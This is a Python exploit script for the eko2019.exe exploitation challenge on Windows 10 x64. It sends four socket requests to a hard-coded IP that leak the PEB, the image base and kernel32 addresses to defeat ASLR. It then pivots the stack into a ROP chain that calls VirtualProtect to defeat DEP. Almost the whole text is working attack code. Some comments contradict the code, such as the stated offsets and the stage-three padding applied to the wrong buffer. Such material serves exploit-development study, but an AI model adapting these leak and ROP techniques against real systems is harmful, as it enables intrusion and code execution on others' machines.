# Blue Frost Security 'eko2019.exe' Memory Corruption (ASLR and DEP Bypass)
# Full ASLR bypass with information leak (no need for non-ASLR modules)
# Author: Connor McGarr
# In muts we trust.
# Tested on Windows 10 x64
import sys
import os
import socket
import struct
import time

# 1st check: First 0x10 (16 bytes) are interpreted as the "header"
# 2nd check: Header starts with 0x393130326f6b45 (Eko2019)
# 3rd check: Message must be < 0x201 (513) bytes

# Defining sleep shorthand
sleep = time.sleep

# Begin header

# Adding null terminator in front of Eko2019 string to let eok2019.exe know this is where our header starts
print "[+] Sending the header..."
exploit = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8

# Exploit begins here

# 560 bytes for total crash (16 for header, 544 for the exploit)
# 512 byte offset to the byte we control
exploit += "\x41" * 512

# This byte converts the instruction we land on after the WriteProcessMemory() call
# \x65 turns this instruction we land on to mov rax,qword ptr gs:[rcx] instead of DS segment register
# The GS segment register gives us access to the PEB at an offset of 0x60
exploit += "\x65"

# \x60 will be moved in gs:[rcx] (\x41's are padding)
exploit += "\x41\x41\x41\x41\x41\x41\x41\x60"

# Making sure only \x60 is in rcx
# Must be a multiple of 8- so null bytes to compensate for the other 7 bytes
exploit += "\x00\x00\x00\x00\x00\x00\x00"

# Message needs to be 528 bytes total (1 byte short of the 529 crash)
exploit += "\x42" * (544-len(exploit))

print "[+] Sending first stage request..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.132", 54321))
s.sendall(exploit)

# Call to eko+0x1000 function (where WriteProcessMemory writes out 1 byte user controlled buffer) returns the value into RAX
# After value is in rax- the server responds with this result (RAX). Here, we are receiving that response and parsing it to find PEB
receive = s.recv(1024)

# Unpacking the response
print "[+] Extracting the PEB of eko2019.exe..."
unpack = struct.unpack_from('<Q', receive)

# Indexing the response (only 1 entry, which is the PEB returned in RAX after call to eko2019+0x100)
peb_addr = unpack[0]

# Print update for PEB location
print "[+] PEB is located at: {0}".format(hex(peb_addr))

# Closing the first stage request connection
s.close()

# Current image (eko2019.exe) base is located at PEB + 0x10
image_base = peb_addr + 0x10
print "[+] Image Base Address for eko2019.exe is located at: {0}".format(hex(image_base))

# Allocate some buffer time between first and second request
sleep(2)

# Second stage- extract the pointer to Image Base Address (which is the base virtual address for eko2019.exe)

# Predefining the Image Base Address in the form of an unsigned long long
real_image_base = struct.pack('<Q', image_base)

# We need to resend the header and setup the second request structure similar to the first.
print "[+] Resending the header for the second stage request..."
exploit_2 = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8

# 512 byte offset to the byte we control
exploit_2 += "\x41" * 512

# A NOP will let our instruction slide into a mov rax, qword ptr ds:[rcx] instruction
exploit_2 += "\x90"

# Padding to loading our value into rcx
exploit_2 += "\x41\x41\x41\x41\x41\x41\x41"

# Filling RCX with our Image Base Address for eko2019.exe
# This mov rax, qword ptr ds:[rcx] operation will extract the pointer and return the actual virtual address base of eko2019.exe
exploit_2 += real_image_base

# Need 528 total bytes
exploit_2 += "\x42" * (544-len(exploit_2))

print "[+] Sending second stage request..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.132", 54321))
s.sendall(exploit_2)

# Reading in rax in the response
receive_2 = s.recv(1024)

# Unpacking the response
print "[+] Extracting the base address of eok2019.exe..."
unpack_2 = struct.unpack_from('<Q', receive_2)

# Indexing the response
base_address = unpack_2[0]

# Print update the virtual address base of eko2019.exe
print "[+] Base virtual address of eko2019.exe is located at: {0}".format(hex(base_address))

# Closing the second stage request
s.close()

# Allocate some buffer time between second and third request
sleep(2)

# Third request - extract pointer to kernel32!GetProcAddressStub in eko2019.exe - and then obtaining address of kernel32!VirtualProtect via the offset between them
# kernel32!GetProcAddressStub is the first kernel32 pointer address LESS than kernel32!VirtualProtect's address and the first address with no null bytes located in eko2019.exe

# Predefining the pointer to kernel32!UnhandledExceptionFilterStub in the form of an unsigned long long
kernel_32_pointer = struct.pack('<Q', base_address+0x9080)

# We need to resend the header and setup the third request structure similar to the previous requests.
print "[+] Resending the header for the third stage request..."
exploit_3 = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8

# 512 byte offset to the byte we control
exploit_3 += "\x41" * 512

# A NOP will let our instruction slide into a mov rax, qword ptr ds:[rcx] instruction
exploit_3 += "\x90"

# Padding to loading our value into rcx
exploit_3 += "\x41\x41\x41\x41\x41\x41\x41"

# Filling RCX with our pointer to kernel32!GetProcAddressStub from eko2019.exe
# This mov rax, qword ptr ds:[rcx] operation will extract the pointer and return the actual virtual address for kernel32!GetProcAddressStub
exploit_3 += kernel_32_pointer

# Need 528 total bytes
exploit_2 += "\x42" * (544-len(exploit_2))

print "[+] Sending third stage request..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.132", 54321))
s.sendall(exploit_3)

# Reading in rax in the response
receive_3 = s.recv(1024)

# Unpacking the response
print "[+] Extracting pointer to kernel32!GetProcAddressStub..."
unpack_3 = struct.unpack_from('<Q', receive_3)

# Indexing the response
kernel_32_placeholder = unpack_3[0]

# kernel32!VirtualProtect is located at kernel32!GetProcAddressStub+6ad0
kernel32_VP = kernel_32_placeholder + 0x2420

# Print update the virtual address base of eko2019.exe
print "[+] kernel32!VirtualProtect is located at: {0}".format(hex(kernel32_VP))

# Closing the second stage request
s.close()

# Allocate some buffer time between third and forth request
sleep(2)

# Fourth stage- stack pivot back to the stack to start executing ROP gadgets.

# Predefining ROP gadget to stack pivot
stack_pivot = struct.pack('<Q', base_address+0x158b)

# We need to resend the header and setup the fourth request structure similar to the previous requests.
print "[+] Resending the header for the fourth stage request..."
exploit_4 = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8

# 16 byte offset to ROP gadgets after stack pivot
exploit_4 += "\x90" * 16

# Begin ROP chain

# x64 uses __fastcall convention

# BOOL VirtualProtect( -> rax
#   LPVOID lpAddress, -> rcx
#   SIZE_T dwSize, -> rdx
#   DWORD  flNewProtect, -> r8
#   PDWORD lpflOldProtect -> r9
# );

# Predefining the base of kernel32.dll in case we need any kernel32.dll ROP gadgets
kernel_32_base = kernel32_VP - 0x1b330

# Print update with kernel32.dll base address
print "[+] kernel32.dll base is located at {0}".format(hex(kernel_32_base))

# Return to the stack (ROP NOP)
exploit_4 += struct.pack('<Q', base_address+0x10a1)			# ret: eko2019.exe

# Eventually, we need to control r9- but there is no 64-bit control of r9. We are limited to the 32-bit version of r9 (r9d)
# The stack's memory addresses are writeable with DEP (has write or execute permissions) and contain less than 32 bits
# r11 leaks an address upon landing into our ROP chain
# Placing that value into RAX and decrementing it 8 bytes, as to not mess with our lpAddress parameter, which starts where rax was before it was decremented
exploit_4 += struct.pack('<Q', base_address+0x7918)			# mov rax, r11 ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', base_address+0x657a)			# dec rax ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', base_address+0x657a)			# dec rax ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', base_address+0x657a)			# dec rax ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', base_address+0x657a)			# dec rax ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', base_address+0x657a)			# dec rax ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', base_address+0x657a)			# dec rax ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', base_address+0x657a)			# dec rax ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', base_address+0x657a)			# dec rax ; ret: eko2019.exe

# A ROP gadget in the future loads a value into r9 (via ebp) to load the needed value of r9 moves ebp into r9d
# Preparing ebp (via rbp) now
exploit_4 += struct.pack('<Q', base_address+0x8600)			# push rax ; pop rbp ; ret: eko2019.exe (THIS SERVERS AS lpflOldProtect!)

# A ROP gadget in the future loads values into rdx (via r13), r8 (via r14)- but not a user controlled value in rcx or r9
# Preparing r13, r14
exploit_4 += struct.pack('<Q', base_address+0x8952)			# pop r14: eko2019.exe	
exploit_4 += struct.pack('<Q', 0x40)						# flNewProtect (0x40 = PAGE_EXECUTE_READWRITE)
exploit_4 += struct.pack('<Q', base_address+0x550f)			# pop r13: eko2019.exe
exploit_4 += struct.pack('<Q', 0x1002)						# dwSize (4098 bytes)

# The next gadget is a COP gadget that does not return, but calls rax
# Placing an add rsp, 0x10 gadget to act as a "return" to the stack into rax
exploit_4 += struct.pack('<Q', base_address+0x1167)			# pop rax ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', base_address+0x8789)			# add rsp, 0x10 ; ret: eko2019.exe 

# Moving kernel32!VirtualProtect parameters into rdx, r8, and r9 registers to adhere to x64 __fastcall calling convention'
# rcx must be taken care of seperately
exploit_4 += struct.pack('<Q', base_address+0x63de)			# mov r9d, ebp ; mov r8, r14 ; mov rdx, r13 ; mov rcx, rbx ; call rax: eko2019.exe
exploit_4 += struct.pack('<Q', 0x4141414141414141)			# Padding to compensate for add rsp, 0x10 

# Getting an address around rsp into a register
# r11 contains a pointer 0xa8 bytes away from the stack.
# Moving r11 into rax
exploit_4 += struct.pack('<Q', base_address+0x7918)			# mov rax, r11 ; ret: eko2019.exe

# Load first parameter into rcx (any address around the stack a.k.a where we want to start the permissions change)
exploit_4 += struct.pack('<Q', base_address+0x4a8e)			# pop r12
exploit_4 += struct.pack('<Q', base_address+0x8789)			# add rsp, 0x10 ; ret

exploit_4 += struct.pack('<Q', base_address+0x6376)			# mov ecx, eax ; call r12
exploit_4 += struct.pack('<Q', 0x4141414141414141)			# Padding to compensate for add rsp, 0x10 

# Load kernel32!VirtualProtect into rax
exploit_4 += struct.pack('<Q', base_address+0x1167)			# pop rax ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', kernel32_VP)					# Address of kernel32!VirtualProtect

# Calling kernel32!VirutalProtect
exploit_4 += struct.pack('<Q', kernel_32_base+0x17c95)		# push rax ; ret: kernel32.dll

exploit_4 += struct.pack('<Q', base_address+0x6379)			# call esp

# 512 byte offset to the byte we control
exploit_4 += "\xCC" * (512-16-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8-8)

# We control rcx. Since we control rcx, why don't we load rcx with a ROP gadget to return to the stack, push it onto the stack (load it in rsp)?
# To our advantage, each mov rax, dword ptr [rcx] instruction exits through a "ret"! This means, we can return into our ROP gadget.
# \x51 = push rcx
exploit_4 += "\x51"

# Padding to loading our value into rcx
exploit_4 += "\x41\x41\x41\x41\x41\x41\x41"

# Loading our ROP gadget of add rsp, 0x78 ; ret (located at eko2019+0x158b) into RCX
exploit_4 += stack_pivot

# Need 528 total bytes
exploit_4 += "\x41" * (544-len(exploit_4))

print "[+] Sending fourth stage request..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.132", 54321))
s.sendall(exploit_4)

# Reading in the response
receive_4 = s.recv(1024)

# Closing the connection
s.close()
